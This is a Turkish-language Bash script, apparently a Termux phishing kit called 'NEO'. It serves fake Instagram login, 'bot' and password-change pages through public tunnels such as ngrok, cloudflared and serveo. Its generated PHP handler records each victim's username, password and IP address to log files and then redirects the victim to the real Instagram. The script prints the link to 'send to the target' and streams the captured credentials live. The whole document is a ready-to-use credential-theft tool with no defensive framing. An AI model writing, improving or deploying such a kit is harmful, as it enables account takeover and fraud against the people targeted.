#!/bin/bash

RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

clear
echo -e "${BLUE}"
echo "╔════════════════════════════╗"
echo "║           N E O            ║"
echo "╚════════════════════════════╝"
echo -e "${NC}"

echo ""
echo "[01] LOCALHOST"
echo "[02] NGROK"
echo "[03] CLOUDFLARED"
echo "[04] LOCALHOST.RUN"
echo "[05] SERVEO"
echo "[06] PAGEKITE"
echo ""
read -p "Tünel Seçimi: " tunnel

clear
echo -e "${BLUE}"
echo "╔════════════════════════════╗"
echo "║           N E O            ║"
echo "╚════════════════════════════╝"
echo -e "${NC}"

echo ""
echo "[01] INSTAGRAM GİRİŞ SAYFASI"
echo "[02] INSTAGRAM BOT BASMA"
echo "[03] INSTAGRAM ŞİFRE DEĞİŞTİRME"
echo ""
read -p "İşlem Seçimi: " choice

case $choice in
    01) SITE="giris" ;;
    02) SITE="bot" ;;
    03) SITE="sifre" ;;
    *) echo "Geçersiz"; exit 1 ;;
esac

mkdir -p "sites/$SITE" logs
cd "sites/$SITE"

cat > login.php << 'EOF'
<?php
$username = $_POST['username'] ?? $_POST['user'] ?? $_POST['email'];
$password = $_POST['password'] ?? $_POST['pass'] ?? $_POST['sifre'];

$ip = $_SERVER['REMOTE_ADDR'];
$date = date('H:i:s');

$log = "[$date] IP: $ip | Kullanici: $username | Sifre: $password\n";
file_put_contents('../../logs/captured.txt', $log, FILE_APPEND);

$term = "Kullanici: $username | Sifre: $password\n";
file_put_contents('../../logs/term.txt', $term, FILE_APPEND);

header('Location: https://www.instagram.com');
exit;
?>
EOF

if [ ! -f "index.html" ]; then
    echo -e "${RED}[!] sites/$SITE/index.html bulunamadı!${NC}"
    exit 1
fi

cd ../..
> logs/term.txt

echo -e "${BLUE}[•] Bağımlılıklar kontrol ediliyor...${NC}"
pkg install php -y 2>/dev/null

echo -e "${BLUE}[•] PHP sunucusu başlatılıyor...${NC}"
php -S 127.0.0.1:8080 &
PHP_PID=$!
sleep 2

LINK=""

case $tunnel in
    01)
        LINK="http://127.0.0.1:8080"
        echo -e "${GREEN}[✓] Localhost başlatıldı${NC}"
        ;;
        
    02)
        echo -e "${BLUE}[•] Ngrok hazırlanıyor...${NC}"
        if [ ! -f "ngrok" ]; then
            wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-arm64.zip
            unzip -q ngrok-stable-linux-arm64.zip
            chmod +x ngrok
            rm ngrok-stable-linux-arm64.zip
        fi
        
        echo -e "${YELLOW}[!] Ngrok token gerekli!${NC}"
        echo -e "${YELLOW}    dashboard.ngrok.com/signup${NC}"
        read -p "Token: " token
        ./ngrok authtoken "$token"
        
        ./ngrok http 8080 > /dev/null 2>&1 &
        sleep 6
        LINK=$(curl -s localhost:4040/api/tunnels | grep -o '"public_url":"[^"]*"' | cut -d'"' -f4)
        echo -e "${GREEN}[✓] Ngrok başlatıldı${NC}"
        ;;
        
    03)
        echo -e "${BLUE}[•] Cloudflared hazırlanıyor...${NC}"
        if ! command -v cloudflared &> /dev/null; then
            pkg install cloudflared -y
        fi
        
        cloudflared tunnel --url http://localhost:8080 > /dev/null 2>&1 &
        sleep 8
        LINK=$(cloudflared tunnel --url http://localhost:8080 2>&1 | grep -o 'https://[a-z0-9]*\.trycloudflare.com' | head -1)
        echo -e "${GREEN}[✓] Cloudflared başlatıldı${NC}"
        ;;
        
    04)
        echo -e "${BLUE}[•] Localhost.run başlatılıyor...${NC}"
        ssh -R 80:localhost:8080 localhost.run 2>&1 &
        sleep 5
        LINK=$(ssh -R 80:localhost:8080 localhost.run 2>&1 | grep -o 'https://[a-z0-9]*\.localhost.run')
        echo -e "${GREEN}[✓] Localhost.run başlatıldı${NC}"
        ;;
        
    05)
        echo -e "${BLUE}[•] Serveo başlatılıyor...${NC}"
        ssh -R 80:localhost:8080 serveo.net 2>&1 &
        sleep 5
        LINK=$(ssh -R 80:localhost:8080 serveo.net 2>&1 | grep -o 'https://[a-z0-9]*\.serveo.net')
        echo -e "${GREEN}[✓] Serveo başlatıldı${NC}"
        ;;
        
    06)
        echo -e "${BLUE}[•] PageKite hazırlanıyor...${NC}"
        if ! command -v pagekite &> /dev/null; then
            pkg install pagekite -y
        fi
        
        echo -e "${YELLOW}[!] PageKite hesabı gerekli!${NC}"
        echo -e "${YELLOW}    pagekite.net adresinden ücretsiz kaydol${NC}"
        read -p "Kite adın (ornek.kite): " kite_name
        
        pagekite 8080 "$kite_name.pagekite.me" > /dev/null 2>&1 &
        sleep 5
        LINK="https://$kite_name.pagekite.me"
        echo -e "${GREEN}[✓] PageKite başlatıldı${NC}"
        ;;
esac

echo ""
echo -e "${GREEN}════════════════════════════════════════${NC}"
echo -e "${GREEN}  🌐 HEDEFE GÖNDERİLECEK LINK:${NC}"
echo -e "${CYAN}  $LINK${NC}"
echo -e "${GREEN}════════════════════════════════════════${NC}"

echo ""
echo -e "${YELLOW}[!] Bilgiler terminalde görünecek...${NC}"
echo -e "${BLUE}[*] Durdurmak için Ctrl+C${NC}"
echo ""

tail -f logs/term.txt 2>/dev/null | while read line; do
    echo -e "${GREEN}[✓]${NC} $line"
done &

trap "kill $PHP_PID 2>/dev/null; pkill ngrok; pkill cloudflared; pkill pagekite; killall ssh 2>/dev/null; echo -e '\n${RED}● Durduruldu${NC}'; exit" INT
wait
